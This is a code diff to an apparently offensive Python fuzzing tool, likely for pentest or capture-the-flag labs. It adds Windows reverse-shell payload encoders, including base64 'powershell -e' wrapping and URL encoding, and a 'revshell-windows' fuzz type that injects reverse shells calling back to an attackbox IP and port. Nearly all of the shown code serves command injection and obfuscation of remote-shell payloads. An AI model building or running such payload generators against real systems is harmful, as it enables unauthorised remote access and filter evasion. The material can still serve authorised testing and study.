@@ -1,4 +1,5 @@
 import argparse
+import base64
 import hashlib
 import json
 import numpy as np
@@ -52,13 +53,25 @@ def url_encoder(w: str):
 def url_encoder_strict(w: str):
     return "".join("%{0:0>2x}".format(ord(c)) if c not in (string.ascii_uppercase + string.ascii_lowercase + string.digits) else c for c in w)
 
-def revshell_encoder(w: str):
+def revshell_encoder_linux(w: str):
     yield w
     yield url_encoder_strict(w)
 
-    bash_wrap = f"bash -c \"{w.replace('"', '\\"')}\""
+    bash_wrap = f"bash -c '{w.replace("'", "\\'")}'"
     yield bash_wrap
     yield url_encoder_strict(bash_wrap)
+
+def revshell_encoder_windows(w: str):
+    yield w
+    yield url_encoder_strict(w)
+
+    powershell_wrap = f"powershell -c '{w.replace("'", "\\'")}'"
+    yield powershell_wrap
+    yield url_encoder_strict(powershell_wrap)
+
+    powershell_encode = f"powershell -e {base64.b64encode(w.encode('utf-16le')).decode('utf-8')}"
+    yield powershell_encode
+    yield url_encoder_strict(powershell_encode)
 
 FUZZ_TYPES = {
     "lfi-general": FuzzType(params = [
@@ -106,11 +119,17 @@ FUZZ_TYPES = {
         ]),
     ], encoders=[url_encoder], required_args=["known_path"]),
 
-    "revshell": FuzzType(params = [
+    "revshell-linux": FuzzType(params = [
         FuzzParameter(name="FUZZ", wordlists=[
             lambda args: [rev.encode() for rev in get_revshells(args.attackbox_ip, args.attackbox_port)]
         ]),
-    ], encoders=[revshell_encoder], required_args=["attackbox_ip", "attackbox_port"]),
+    ], encoders=[revshell_encoder_linux], required_args=["attackbox_ip", "attackbox_port"]),
+
+    "revshell-windows": FuzzType(params = [
+        FuzzParameter(name="FUZZ", wordlists=[
+            lambda args: [rev.encode() for rev in get_revshells(args.attackbox_ip, args.attackbox_port)]
+        ]),
+    ], encoders=[revshell_encoder_windows], required_args=["attackbox_ip", "attackbox_port"]),
 }
 
 MAX_DISPLAY_RESULTS = 10
